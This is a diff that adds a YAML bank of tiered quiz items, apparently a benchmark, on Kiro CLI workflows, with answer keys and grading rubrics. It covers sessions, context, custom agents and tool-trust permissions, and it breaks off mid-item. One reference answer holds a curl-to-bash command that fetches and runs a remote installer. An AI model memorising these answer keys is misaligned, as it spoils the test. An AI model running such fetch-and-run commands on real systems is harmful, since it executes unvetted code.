@@ -1,0 +1,2478 @@
+# Topic: kiro-cli-workflows (kiro-cli)
+# End-to-end Kiro CLI workflows — chat/agent sessions, context management, custom agents, session persistence.
+# 100 items, 20/tier (100-500). Authored + adversarially reviewed for correctness, recency, calibration, dedup.
+
+id: kiro-cli-workflows
+class:
+  kind: tool
+  tool: kiro-cli
+title: Kiro CLI Workflows
+summary: >-
+  End-to-end Kiro CLI workflows — chat/agent sessions, context management, custom agents, session
+  persistence.
+triggerSignals: []
+items:
+  - id: kcw-100-mc-a
+    tier: 100
+    bloom: remember
+    difficulty: 122
+    type: multiple_choice
+    prompt: Which command opens an interactive Kiro CLI chat/agent session?
+    choices:
+      - id: a
+        text: kiro-cli chat
+      - id: b
+        text: kiro-cli session
+      - id: c
+        text: kiro-cli run
+      - id: d
+        text: kiro-cli open
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: >-
+      kiro-cli chat starts an interactive agent session (running the bare binary kiro-cli does the
+      same). There is no session, run, or open subcommand for this.
+  - id: kcw-100-mc-b
+    tier: 100
+    bloom: remember
+    difficulty: 125
+    type: multiple_choice
+    prompt: >-
+      Inside a Kiro CLI chat session, which prefix runs a raw shell command WITHOUT sending it to
+      the model?
+    choices:
+      - id: a
+        text: / (slash)
+      - id: b
+        text: '! (exclamation)'
+      - id: c
+        text: '@ (at)'
+      - id: d
+        text: '# (hash)'
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: >-
+      A leading ! runs the line as a shell command directly, e.g. !npm run build. Slash invokes
+      built-in commands; # and @ are context references, not shell escapes.
+  - id: kcw-100-mc-c
+    tier: 100
+    bloom: remember
+    difficulty: 128
+    type: multiple_choice
+    prompt: Which startup flag scopes a Kiro CLI session to a named custom agent?
+    choices:
+      - id: a
+        text: '--profile'
+      - id: b
+        text: '--persona'
+      - id: c
+        text: '--agent'
+      - id: d
+        text: '--mode'
+    answerKey:
+      kind: choice
+      correctChoiceId: c
+    guidance: >-
+      kiro-cli --agent myagent (or kiro-cli chat --agent myagent) launches the session bound to that
+      custom agent's configuration.
+  - id: kcw-100-mc-d
+    tier: 100
+    bloom: remember
+    difficulty: 131
+    type: multiple_choice
+    prompt: >-
+      In a Kiro CLI session, which slash command opens an external editor for composing a longer
+      prompt?
+    choices:
+      - id: a
+        text: /edit
+      - id: b
+        text: /compose
+      - id: c
+        text: /write
+      - id: d
+        text: /editor
+    answerKey:
+      kind: choice
+      correctChoiceId: d
+    guidance: >-
+      /editor opens an editor for multi-line input; per the docs it defaults to vi. The others are
+      not the documented command.
+  - id: kcw-100-mc-e
+    tier: 100
+    bloom: remember
+    difficulty: 134
+    type: multiple_choice
+    prompt: By default, which editor does the /editor command open in a Kiro CLI session?
+    choices:
+      - id: a
+        text: vi
+      - id: b
+        text: nano
+      - id: c
+        text: emacs
+      - id: d
+        text: code
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: /editor defaults to vi. A common misconception is that the default is nano.
+  - id: kcw-100-mc-f
+    tier: 100
+    bloom: remember
+    difficulty: 137
+    type: multiple_choice
+    prompt: Which slash command manages the working context (show/add/remove/clear) in a Kiro CLI session?
+    choices:
+      - id: a
+        text: /files
+      - id: b
+        text: /context
+      - id: c
+        text: /include
+      - id: d
+        text: /scope
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: >-
+      /context with subcommands show, add, remove, and clear manages what files/providers are in the
+      session's context.
+  - id: kcw-100-mc-g
+    tier: 100
+    bloom: remember
+    difficulty: 140
+    type: multiple_choice
+    prompt: Which slash command saves the current Kiro CLI conversation to a file?
+    choices:
+      - id: a
+        text: /export
+      - id: b
+        text: /dump
+      - id: c
+        text: /chat save
+      - id: d
+        text: /snapshot
+    answerKey:
+      kind: choice
+      correctChoiceId: c
+    guidance: >-
+      /chat save [path] writes the conversation to a JSON file; /chat load restores it. /chat new
+      and /chat resume manage live sessions.
+  - id: kcw-100-mc-h
+    tier: 100
+    bloom: remember
+    difficulty: 143
+    type: multiple_choice
+    prompt: What does /chat load do in a Kiro CLI session?
+    choices:
+      - id: a
+        text: Loads an MCP server
+      - id: b
+        text: Reloads the agent configuration
+      - id: c
+        text: Loads a steering document
+      - id: d
+        text: Restores a previously saved conversation from a file
+    answerKey:
+      kind: choice
+      correctChoiceId: d
+    guidance: >-
+      /chat load reads a conversation file written earlier by /chat save and restores it into the
+      session.
+  - id: kcw-100-mc-i
+    tier: 100
+    bloom: remember
+    difficulty: 146
+    type: multiple_choice
+    prompt: Kiro CLI is the rebrand/successor of which earlier AWS tool?
+    choices:
+      - id: a
+        text: Amazon Q Developer CLI
+      - id: b
+        text: AWS CodeWhisperer Toolkit
+      - id: c
+        text: AWS Cloud9 CLI
+      - id: d
+        text: AWS SAM CLI
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: >-
+      AWS docs state Kiro is a rebrand of Amazon Q Developer, and the amazon-q-developer-cli repo
+      notes the CLI is now available as Kiro CLI.
+  - id: kcw-100-mc-j
+    tier: 100
+    bloom: remember
+    difficulty: 149
+    type: multiple_choice
+    prompt: >-
+      What is the DEFAULT operating mode of Kiro's agent (the autopilot switch in the chat
+      interface)?
+    choices:
+      - id: a
+        text: Supervised
+      - id: b
+        text: Autopilot
+      - id: c
+        text: Read-only
+      - id: d
+        text: Plan-only
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: >-
+      Autopilot is the default: the agent works autonomously end-to-end. Supervised mode (per-turn
+      approval of edits) is the opt-in alternative.
+  - id: kcw-100-mc-k
+    tier: 100
+    bloom: remember
+    difficulty: 152
+    type: multiple_choice
+    prompt: In the CLI v2 trust system, which slash command manages tool permissions?
+    choices:
+      - id: a
+        text: /trust
+      - id: b
+        text: /permissions
+      - id: c
+        text: /tools
+      - id: d
+        text: /grant
+    answerKey:
+      kind: choice
+      correctChoiceId: c
+    guidance: >-
+      /tools manages tool permissions, with subcommands trust, untrust, trust-all, reset, and help.
+      There is no /trust command in the verified docs.
+  - id: kcw-100-mc-l
+    tier: 100
+    bloom: remember
+    difficulty: 155
+    type: multiple_choice
+    prompt: Which /tools subcommand replaced the deprecated /acceptall?
+    choices:
+      - id: a
+        text: /tools allow
+      - id: b
+        text: /tools yolo
+      - id: c
+        text: /tools auto
+      - id: d
+        text: /tools trust-all
+    answerKey:
+      kind: choice
+      correctChoiceId: d
+    guidance: >-
+      /tools trust-all trusts every tool for the session and is the documented replacement for the
+      deprecated /acceptall.
+  - id: kcw-100-mc-m
+    tier: 100
+    bloom: remember
+    difficulty: 158
+    type: multiple_choice
+    prompt: >-
+      In the CLI v2 trust model, which built-in tool is trusted by default for the current working
+      directory?
+    choices:
+      - id: a
+        text: read
+      - id: b
+        text: write
+      - id: c
+        text: shell
+      - id: d
+        text: aws
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: >-
+      read is trusted by default within the current working directory; write, shell, and aws prompt
+      for confirmation unless explicitly trusted.
+  - id: kcw-100-ff-a
+    tier: 100
+    bloom: remember
+    difficulty: 161
+    type: free_form
+    prompt: >-
+      List the four /tools subcommands (besides help) used to manage tool permissions in a Kiro CLI
+      session.
+    rubric:
+      criteria:
+        - id: c1
+          text: Names trust
+        - id: c2
+          text: Names untrust
+        - id: c3
+          text: Names trust-all
+        - id: c4
+          text: Names reset
+      referenceAnswer: trust, untrust, trust-all, and reset (plus help).
+      passThreshold: 0.6
+    guidance: >-
+      These cover granting trust, revoking it, trusting everything, and resetting to defaults.
+      trust-all replaces the old /acceptall.
+  - id: kcw-100-ff-b
+    tier: 100
+    bloom: remember
+    difficulty: 164
+    type: free_form
+    prompt: Name the five built-in tools in the Kiro CLI v2 permission system.
+    rubric:
+      criteria:
+        - id: c1
+          text: Names read
+        - id: c2
+          text: Names write
+        - id: c3
+          text: Names shell
+        - id: c4
+          text: Names aws
+        - id: c5
+          text: Names report
+      referenceAnswer: read, write, shell, aws, and report.
+      passThreshold: 0.6
+    guidance: >-
+      These are the v2 built-in tools. Note v3 Early Access renames the filesystem ones to fs_read /
+      fs_write while keeping shell.
+  - id: kcw-100-ff-c
+    tier: 100
+    bloom: remember
+    difficulty: 167
+    type: free_form
+    prompt: Name the four /context subcommands available in a Kiro CLI session.
+    rubric:
+      criteria:
+        - id: c1
+          text: Names show
+        - id: c2
+          text: Names add
+        - id: c3
+          text: Names remove
+        - id: c4
+          text: Names clear
+      referenceAnswer: show, add, remove, and clear.
+      passThreshold: 0.6
+    guidance: >-
+      /context show lists the current context; add/remove adjust included files or providers; clear
+      empties it.
+  - id: kcw-100-ff-d
+    tier: 100
+    bloom: remember
+    difficulty: 170
+    type: free_form
+    prompt: >-
+      What are the two permission STATES a tool can be in under the CLI v2 trust model, and how does
+      each behave at invocation time?
+    rubric:
+      criteria:
+        - id: c1
+          text: Names Trusted (runs without a per-use prompt)
+        - id: c2
+          text: Names Per-request (confirms each time / asks before running)
+      referenceAnswer: >-
+        Trusted (runs without per-use prompts) and Per-request (the agent confirms with you each
+        time before running).
+      passThreshold: 0.6
+    guidance: >-
+      Trust removes the per-use confirmation for that tool/pattern; per-request keeps the human in
+      the loop on every call.
+  - id: kcw-100-ff-e
+    tier: 100
+    bloom: remember
+    difficulty: 173
+    type: free_form
+    prompt: >-
+      List the three options offered by the Kiro CLI approval prompt when a tool invocation needs
+      confirmation.
+    rubric:
+      criteria:
+        - id: c1
+          text: Names Yes (allow once)
+        - id: c2
+          text: Names Trust (allow and remember)
+        - id: c3
+          text: Names No (deny)
+      referenceAnswer: Yes, Trust, and No.
+      passThreshold: 0.6
+    guidance: >-
+      Yes allows just this call, Trust also auto-approves other pending invocations of the same tool
+      in the batch, and No denies it.
+  - id: kcw-100-ff-f
+    tier: 100
+    bloom: remember
+    difficulty: 176
+    type: free_form
+    prompt: What command installs Kiro CLI on macOS/Linux, and what is the primary binary name?
+    rubric:
+      criteria:
+        - id: c1
+          text: Gives the curl ... | bash install from cli.kiro.dev
+        - id: c2
+          text: States the binary is kiro-cli
+      referenceAnswer: >-
+        Install with: curl -fsSL https://cli.kiro.dev/install | bash. The primary binary is
+        kiro-cli.
+      passThreshold: 0.6
+    guidance: >-
+      kiro-cli is the terminal agent; kiro-cli chat (or the bare binary) opens an interactive
+      session.
+  - id: kcw-100-ff-g
+    tier: 100
+    bloom: remember
+    difficulty: 179
+    type: free_form
+    prompt: Name three of the CLI capability surfaces Kiro documents for end-to-end workflows.
+    rubric:
+      criteria:
+        - id: c1
+          text: Names interactive chat / sessions
+        - id: c2
+          text: Names custom agents OR agent steering
+        - id: c3
+          text: Names MCP integration OR smart/agent hooks OR auto complete
+      referenceAnswer: >-
+        Interactive chat sessions, custom agents, MCP integration, smart hooks (pre/post command
+        hooks), agent steering, and auto complete are all documented CLI capabilities.
+      passThreshold: 0.6
+    guidance: >-
+      The CLI is a standalone terminal agent, not a wrapper around the IDE; these capabilities make
+      full workflows possible from the terminal.
+  - id: kcw-200-mc-a
+    tier: 200
+    bloom: understand
+    difficulty: 222
+    type: multiple_choice
+    prompt: >-
+      Why does choosing 'Trust' (rather than 'Yes') at a Kiro CLI approval prompt speed up a batch
+      of edits?
+    choices:
+      - id: a
+        text: It disables all future prompts permanently across every project
+      - id: b
+        text: It auto-approves the other pending invocations of that same tool in the current batch
+      - id: c
+        text: It runs the tool with elevated OS privileges
+      - id: d
+        text: It commits the changes to git automatically
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: >-
+      Trust applies to the same tool's other queued invocations in that batch, so a multi-file edit
+      doesn't prompt once per file. It does not grant OS privileges or auto-commit.
+  - id: kcw-200-mc-b
+    tier: 200
+    bloom: understand
+    difficulty: 225
+    type: multiple_choice
+    prompt: How does Supervised mode differ from Autopilot when the agent makes file edits?
+    choices:
+      - id: a
+        text: Supervised silently applies edits and logs them
+      - id: b
+        text: Supervised disables file edits entirely
+      - id: c
+        text: >-
+          Supervised yields for your approval after each turn containing edits, shown as
+          accept/reject hunks
+      - id: d
+        text: Supervised only differs in which model is used
+    answerKey:
+      kind: choice
+      correctChoiceId: c
+    guidance: >-
+      Supervised pauses after each edit-bearing turn so you can accept/reject changes per-hunk,
+      per-file, or all at once. Autopilot applies them and continues.
+  - id: kcw-200-mc-c
+    tier: 200
+    bloom: understand
+    difficulty: 228
+    type: multiple_choice
+    prompt: What is the practical reason to use /chat save before ending a Kiro CLI session?
+    choices:
+      - id: a
+        text: It is required or the agent loses its license
+      - id: b
+        text: It uploads the chat to AWS for billing
+      - id: c
+        text: It compacts the context to free memory
+      - id: d
+        text: It persists the conversation to a JSON file so it can be reloaded later with /chat load
+    answerKey:
+      kind: choice
+      correctChoiceId: d
+    guidance: >-
+      /chat save serializes the conversation to a file you can restore later via /chat load — useful
+      for resuming a thread of work across sessions.
+  - id: kcw-200-mc-d
+    tier: 200
+    bloom: understand
+    difficulty: 231
+    type: multiple_choice
+    prompt: Why is the ! shell escape useful in the middle of an interactive Kiro CLI session?
+    choices:
+      - id: a
+        text: >-
+          It lets you run a command (e.g. !git status) and feed yourself the result without spending
+          a model turn interpreting it
+      - id: b
+        text: It forces the model to use a faster mode
+      - id: c
+        text: It bypasses the trust system for write operations
+      - id: d
+        text: It clears the context window
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: >-
+      ! runs the raw command directly in your shell, so you can check state quickly without the
+      agent reasoning about it. It is not a trust bypass for agent-initiated tools.
+  - id: kcw-200-mc-e
+    tier: 200
+    bloom: understand
+    difficulty: 234
+    type: multiple_choice
+    prompt: >-
+      Why does the CLI's shell trust use tiers (full command, pattern, base command, entire tool)
+      instead of a single on/off switch?
+    choices:
+      - id: a
+        text: Because the shell tool cannot be fully trusted at all
+      - id: b
+        text: >-
+          To let you grant the narrowest trust that unblocks your workflow (e.g. only 'git pull *')
+          instead of trusting every shell command
+      - id: c
+        text: To make the prompts appear more often
+      - id: d
+        text: Tiers only affect logging, not behavior
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: >-
+      Tiered scoping lets you trust just 'git pull --rebase', or 'git pull *', or 'git *', or '*'.
+      You grant the least privilege that keeps the workflow moving.
+  - id: kcw-200-mc-f
+    tier: 200
+    bloom: understand
+    difficulty: 237
+    type: multiple_choice
+    prompt: >-
+      How do the v2 tool names differ from the v3 Early Access capability names for filesystem
+      access?
+    choices:
+      - id: a
+        text: They are identical in both versions
+      - id: b
+        text: v2 uses fs_read/fs_write; v3 uses read/write
+      - id: c
+        text: v2 uses read/write; v3 uses fs_read/fs_write (shell stays shell)
+      - id: d
+        text: v3 removes filesystem access entirely
+    answerKey:
+      kind: choice
+      correctChoiceId: c
+    guidance: >-
+      v2 names the filesystem tools read and write; v3 renames them fs_read and fs_write while
+      keeping shell. Treat the schemes as NOT interchangeable.
+  - id: kcw-200-mc-g
+    tier: 200
+    bloom: understand
+    difficulty: 240
+    type: multiple_choice
+    prompt: >-
+      Why can a path inside the current working directory be read without triggering the trust
+      picker?
+    choices:
+      - id: a
+        text: All paths everywhere are trusted by default
+      - id: b
+        text: The picker is disabled in CLI mode
+      - id: c
+        text: Because reads are never tracked
+      - id: d
+        text: read is trusted by default for the CWD; only paths outside it prompt
+    answerKey:
+      kind: choice
+      correctChoiceId: d
+    guidance: >-
+      The read tool is trusted within the CWD by default, so in-repo reads are frictionless;
+      reaching outside the CWD raises the path trust picker.
+  - id: kcw-200-mc-h
+    tier: 200
+    bloom: understand
+    difficulty: 243
+    type: multiple_choice
+    prompt: What is the difference between /chat new and /chat resume?
+    choices:
+      - id: a
+        text: /chat new starts a fresh conversation; /chat resume continues an existing persisted one
+      - id: b
+        text: /chat new is for MCP; /chat resume is for hooks
+      - id: c
+        text: They are aliases
+      - id: d
+        text: /chat new clears context but keeps history; /chat resume deletes history
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: >-
+      /chat new opens a fresh thread, while /chat resume picks up a previously persisted
+      conversation rather than starting from scratch.
+  - id: kcw-200-mc-i
+    tier: 200
+    bloom: understand
+    difficulty: 246
+    type: multiple_choice
+    prompt: Why does launching with --agent change more than just a name?
+    choices:
+      - id: a
+        text: It only changes the prompt color
+      - id: b
+        text: >-
+          It binds the session to that agent's configuration — its tools, allowed commands,
+          resources, and steering
+      - id: c
+        text: It switches the underlying model vendor
+      - id: d
+        text: It disables MCP for the session
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: >-
+      A custom agent carries its own tool list, trust/allowed-command rules, context resources, and
+      steering, so --agent reshapes how the whole session behaves.
+  - id: kcw-200-mc-j
+    tier: 200
+    bloom: understand
+    difficulty: 249
+    type: multiple_choice
+    prompt: >-
+      Why is it accurate to say the Kiro CLI is a standalone terminal agent rather than a wrapper
+      around the IDE?
+    choices:
+      - id: a
+        text: The CLI cannot edit files
+      - id: b
+        text: The IDE is built on top of the CLI
+      - id: c
+        text: >-
+          A unified agent harness powers IDE, Web, and CLI from one engine; the CLI runs the agent
+          directly in the terminal
+      - id: d
+        text: The CLI only sends prompts to the IDE process
+    answerKey:
+      kind: choice
+      correctChoiceId: c
+    guidance: >-
+      v3 describes a unified agent harness powering IDE, Web, and CLI. The CLI runs the agent
+      itself; it is not remote-controlling an IDE instance.
+  - id: kcw-200-mc-k
+    tier: 200
+    bloom: understand
+    difficulty: 252
+    type: multiple_choice
+    prompt: Under v3 declarative permissions, why does a deny rule beat an allow rule that also matches?
+    choices:
+      - id: a
+        text: Rules are applied in file order, last wins
+      - id: b
+        text: Allow rules are ignored entirely
+      - id: c
+        text: Deny rules only apply to shell
+      - id: d
+        text: 'Effects resolve by restrictiveness: deny > ask > allow, so the stricter effect always wins'
+    answerKey:
+      kind: choice
+      correctChoiceId: d
+    guidance: >-
+      v3 resolves overlapping rules by restrictiveness (deny beats ask beats allow), so a permissive
+      rule can never override a stricter matching rule.
+  - id: kcw-200-mc-l
+    tier: 200
+    bloom: understand
+    difficulty: 255
+    type: multiple_choice
+    prompt: >-
+      Why are v3 workspace permission rules stored per-user outside the repo rather than in the
+      project tree?
+    choices:
+      - id: a
+        text: >-
+          So a cloned repository cannot inject trust rules that grant the agent extra access on your
+          machine
+      - id: b
+        text: To save disk space in the repo
+      - id: c
+        text: Because YAML cannot be committed to git
+      - id: d
+        text: To let teammates share one trust file
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: >-
+      Workspace permissions live under ~/.kiro/workspace-roots/<hash>/, per-user and outside the
+      repo, so untrusted code you clone can't ship rules that auto-trust the agent.
+  - id: kcw-200-mc-m
+    tier: 200
+    bloom: understand
+    difficulty: 258
+    type: multiple_choice
+    prompt: What does it mean that you can toggle Autopilot/Supervised 'at any time' during a session?
+    choices:
+      - id: a
+        text: You must restart the session to change modes
+      - id: b
+        text: >-
+          You can flip the autopilot switch mid-session; Autopilot still lets you view changes,
+          revert, or interrupt
+      - id: c
+        text: Mode is fixed by the agent file and cannot change
+      - id: d
+        text: Toggling clears the conversation
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: >-
+      The mode is a live switch in the chat interface. Even in Autopilot you retain View all changes
+      / Revert / interrupt controls.
+  - id: kcw-200-ff-a
+    tier: 200
+    bloom: understand
+    difficulty: 261
+    type: free_form
+    prompt: >-
+      Explain why /context add and the # context provider both feed the model, but serve different
+      roles in a session.
+    rubric:
+      criteria:
+        - id: c1
+          text: >-
+            Notes /context add manages persistent session context (files/providers explicitly
+            included)
+        - id: c2
+          text: 'Notes # references pull a specific item (e.g. a spec or steering doc) inline in a prompt'
+        - id: c3
+          text: Concludes both supply context but at different granularity/lifetime
+      referenceAnswer: >-
+        /context add manages the session's standing context set — files or providers that persist
+        across turns. A # reference (e.g. #spec) pulls a specific item into a single prompt inline.
+        Both give the model information, but /context is durable session scope while # is a
+        per-message inclusion.
+      passThreshold: 0.6
+    guidance: >-
+      Persistent context vs inline reference is the key distinction; conflating them leads to either
+      bloated context or missing references.
+  - id: kcw-200-ff-b
+    tier: 200
+    bloom: understand
+    difficulty: 264
+    type: free_form
+    prompt: Explain how shell trust patterns persist within a session and where they end up being stored.
+    rubric:
+      criteria:
+        - id: c1
+          text: States trusted shell patterns persist for the session
+        - id: c2
+          text: States they are stored as regex in the agent's allowedCommands
+      referenceAnswer: >-
+        When you trust a shell pattern (e.g. 'git pull *'), it is remembered for the rest of the
+        session and stored as a regex entry in the agent's allowedCommands.
+      passThreshold: 0.6
+    guidance: >-
+      This is why repeated git operations stop prompting after the first trust, and why the trust is
+      tied to the agent's configuration.
+  - id: kcw-200-ff-c
+    tier: 200
+    bloom: understand
+    difficulty: 267
+    type: free_form
+    prompt: >-
+      Compare the v2 /tools trust model with the v3 declarative permissions.yaml model in terms of
+      HOW trust is expressed.
+    rubric:
+      criteria:
+        - id: c1
+          text: 'v2 is session/interactive: you trust tools/patterns live via /tools'
+        - id: c2
+          text: 'v3 is declarative: rules in permissions.yaml with capability/match/exclude/effect'
+        - id: c3
+          text: Notes v3 resolves by restrictiveness (deny>ask>allow)
+      referenceAnswer: >-
+        v2 is interactive and session-based: you trust tools or shell/path patterns on the fly with
+        /tools (trust/untrust/trust-all). v3 is declarative: you write rules in permissions.yaml
+        with capability, match, exclude, and effect fields, and effects resolve by restrictiveness
+        (deny>ask>allow).
+      passThreshold: 0.6
+    guidance: >-
+      Kiro is mid-migration between these. v2 trust is ephemeral and per-session; v3 is file-defined
+      and deterministic.
+  - id: kcw-200-ff-d
+    tier: 200
+    bloom: understand
+    difficulty: 270
+    type: free_form
+    prompt: >-
+      Why does headless / non-interactive CLI use require an explicit prompt argument, unlike an
+      interactive session?
+    rubric:
+      criteria:
+        - id: c1
+          text: States interactive mode reads prompts from the user turn by turn
+        - id: c2
+          text: States headless mode has no interactive input, so it needs the task supplied up front
+      referenceAnswer: >-
+        An interactive session collects prompts from the user one turn at a time. A headless
+        (non-interactive) invocation has no interactive input loop, so the task must be passed up
+        front as a prompt argument for the agent to act on.
+      passThreshold: 0.6
+    guidance: >-
+      This is why CI pipelines pass the instruction inline; there is no human at the prompt to type
+      the next turn.
+  - id: kcw-200-ff-e
+    tier: 200
+    bloom: understand
+    difficulty: 273
+    type: free_form
+    prompt: >-
+      Explain why 'Autopilot is the default' is a deliberate design choice, and what tradeoff
+      Supervised mode makes.
+    rubric:
+      criteria:
+        - id: c1
+          text: Autopilot prioritizes end-to-end autonomy/throughput by default
+        - id: c2
+          text: Supervised trades speed for per-turn human review of edits
+        - id: c3
+          text: Notes the user can still review/revert even in Autopilot
+      referenceAnswer: >-
+        Autopilot defaults to autonomy so the agent completes multi-step tasks end-to-end without
+        per-step approval, maximizing throughput. Supervised trades that speed for safety, yielding
+        after each edit-bearing turn so you review hunks. Even in Autopilot you can view all
+        changes, revert, or interrupt, so default autonomy is not irreversible.
+      passThreshold: 0.6
+    guidance: >-
+      The default optimizes for getting work done; the safety net (review/revert) is what makes
+      defaulting to autonomy reasonable.
+  - id: kcw-200-ff-f
+    tier: 200
+    bloom: understand
+    difficulty: 276
+    type: free_form
+    prompt: >-
+      Explain the relationship between Kiro CLI and the Amazon Q Developer CLI, and why that lineage
+      matters for users.
+    rubric:
+      criteria:
+        - id: c1
+          text: States Kiro CLI is the rebrand/successor of Amazon Q Developer CLI
+        - id: c2
+          text: >-
+            Notes a consequence: familiar functionality / migration path / it descends from AWS
+            tooling
+      referenceAnswer: >-
+        Kiro CLI is the rebrand and successor of the Amazon Q Developer CLI — AWS docs describe Kiro
+        as a rebrand of Amazon Q Developer, and the amazon-q-developer-cli repo states the CLI is
+        now Kiro CLI. For users this means it inherits the prior tool's functionality and an AWS
+        lineage rather than being an unrelated new product.
+      passThreshold: 0.6
+    guidance: >-
+      It is not a brand-new unrelated codebase; understanding the lineage explains overlapping
+      concepts and the AWS account/auth model.
+  - id: kcw-200-ff-g
+    tier: 200
+    bloom: understand
+    difficulty: 279
+    type: free_form
+    prompt: >-
+      Why does choosing the narrowest viable shell-trust tier (e.g. 'git pull *' over '*') matter
+      for a long autonomous session?
+    rubric:
+      criteria:
+        - id: c1
+          text: Narrow trust limits blast radius if the agent goes off-track
+        - id: c2
+          text: Trusting the entire tool ('*') auto-approves arbitrary commands for the session
+      referenceAnswer: >-
+        Trusting only a narrow pattern like 'git pull *' lets that workflow proceed without prompts
+        while still gating every other shell command. Trusting the entire tool ('*') auto-approves
+        any command for the session, so a misguided or compromised step could run anything. Narrow
+        trust keeps the blast radius small while preserving flow.
+      passThreshold: 0.6
+    guidance: >-
+      Least-privilege trust is the safe default; broad trust trades safety for convenience and is
+      hard to walk back mid-session.
+  - id: kcw-300-mc-a
+    tier: 300
+    bloom: apply
+    difficulty: 322
+    type: multiple_choice
+    prompt: >-
+      You want to start a Kiro CLI session that uses your 'reviewer' custom agent. Which command do
+      you run?
+    choices:
+      - id: a
+        text: kiro-cli chat --persona reviewer
+      - id: b
+        text: kiro-cli chat reviewer
+      - id: c
+        text: kiro-cli --agent reviewer
+      - id: d
+        text: kiro-cli run reviewer
+    answerKey:
+      kind: choice
+      correctChoiceId: c
+    guidance: >-
+      kiro-cli --agent reviewer (equivalently kiro-cli chat --agent reviewer) scopes the session to
+      that agent. There is no --persona flag or positional agent argument.
+  - id: kcw-300-mc-b
+    tier: 300
+    bloom: apply
+    difficulty: 325
+    type: multiple_choice
+    prompt: >-
+      Mid-session you need to quickly check the git status without the agent reasoning about it.
+      What do you type?
+    choices:
+      - id: a
+        text: /shell git status
+      - id: b
+        text: git status
+      - id: c
+        text: '@git status'
+      - id: d
+        text: '!git status'
+    answerKey:
+      kind: choice
+      correctChoiceId: d
+    guidance: >-
+      !git status runs the command directly in your shell and returns the output without a model
+      turn. A bare 'git status' would be treated as a prompt to the agent.
+  - id: kcw-300-mc-c
+    tier: 300
+    bloom: apply
+    difficulty: 328
+    type: multiple_choice
+    prompt: >-
+      You finished a long debugging conversation and want to resume it tomorrow. Which sequence
+      achieves that?
+    choices:
+      - id: a
+        text: /chat save debug.json today, then /chat load debug.json tomorrow
+      - id: b
+        text: /context save then /context load
+      - id: c
+        text: /export then /import
+      - id: d
+        text: /snapshot then /restore
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: >-
+      /chat save writes the conversation to a JSON file; /chat load restores it in a future session.
+      /context and the others are not the persistence commands.
+  - id: kcw-300-mc-d
+    tier: 300
+    bloom: apply
+    difficulty: 331
+    type: multiple_choice
+    prompt: >-
+      The agent keeps prompting before each 'git pull --rebase' during a multi-step task. You want
+      only that exact workflow trusted, nothing broader. What do you do?
+    choices:
+      - id: a
+        text: /tools trust-all
+      - id: b
+        text: Choose Trust and accept the FULL command tier (git pull --rebase) at the prompt
+      - id: c
+        text: Trust the entire shell tool ('*')
+      - id: d
+        text: Disable the shell tool
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: >-
+      Trusting at the full-command tier (git pull --rebase) unblocks exactly that command. trust-all
+      or the '*' tier would trust far more than you need.
+  - id: kcw-300-mc-e
+    tier: 300
+    bloom: apply
+    difficulty: 334
+    type: multiple_choice
+    prompt: >-
+      In a CI pipeline you run Kiro headless and it must complete without any trust prompts. Which
+      v3 rule expresses 'full access'?
+    choices:
+      - id: a
+        text: 'capability: shell, effect: ask'
+      - id: b
+        text: 'capability: fs_read, effect: allow'
+      - id: c
+        text: 'capability: all, effect: allow'
+      - id: d
+        text: 'capability: builtin, effect: deny'
+    answerKey:
+      kind: choice
+      correctChoiceId: c
+    guidance: >-
+      capability: all with effect: allow is the documented pattern for CI needing full access. The
+      others either ask, are too narrow, or deny.
+  - id: kcw-300-mc-f
+    tier: 300
+    bloom: apply
+    difficulty: 337
+    type: multiple_choice
+    prompt: >-
+      You want the agent to read files anywhere under ./src without a prompt but keep prompting
+      elsewhere. Using v3 rules, which capability and effect do you set?
+    choices:
+      - id: a
+        text: 'capability: fs_write, match: [''src/**''], effect: allow'
+      - id: b
+        text: 'capability: shell, match: [''src/**''], effect: allow'
+      - id: c
+        text: 'capability: all, match: [''src/**''], effect: ask'
+      - id: d
+        text: 'capability: fs_read, match: [''src/**''], effect: allow'
+    answerKey:
+      kind: choice
+      correctChoiceId: d
+    guidance: >-
+      fs_read with match ['src/**'] and effect allow grants frictionless reads under src while other
+      paths fall back to the default (typically ask).
+  - id: kcw-300-mc-g
+    tier: 300
+    bloom: apply
+    difficulty: 340
+    type: multiple_choice
+    prompt: >-
+      You're pairing with the agent and want to review every file change before it lands. Which mode
+      do you switch to?
+    choices:
+      - id: a
+        text: Supervised
+      - id: b
+        text: Autopilot
+      - id: c
+        text: Headless
+      - id: d
+        text: Plan-only
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: >-
+      Supervised yields after each edit-bearing turn so you accept/reject hunks. Autopilot would
+      apply edits without per-turn approval.
+  - id: kcw-300-mc-h
+    tier: 300
+    bloom: apply
+    difficulty: 343
+    type: multiple_choice
+    prompt: >-
+      You want a spec you're implementing to be referenced in your prompt so the agent aligns to its
+      requirements. What do you include?
+    choices:
+      - id: a
+        text: An @spec mention
+      - id: b
+        text: 'A #spec context reference'
+      - id: c
+        text: The /spec command
+      - id: d
+        text: A --spec flag
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: >-
+      The #spec context provider pulls in the associated spec files so the agent implements against
+      the documented requirements/design/tasks.
+  - id: kcw-300-mc-i
+    tier: 300
+    bloom: apply
+    difficulty: 346
+    type: multiple_choice
+    prompt: >-
+      You started in Autopilot but the task is risky. You want to keep the conversation but review
+      changes from now on. What's the least-disruptive action?
+    choices:
+      - id: a
+        text: Kill the session and start over in Supervised
+      - id: b
+        text: Run /chat new
+      - id: c
+        text: Toggle the autopilot switch to Supervised mid-session
+      - id: d
+        text: Delete the agent file
+    answerKey:
+      kind: choice
+      correctChoiceId: c
+    guidance: >-
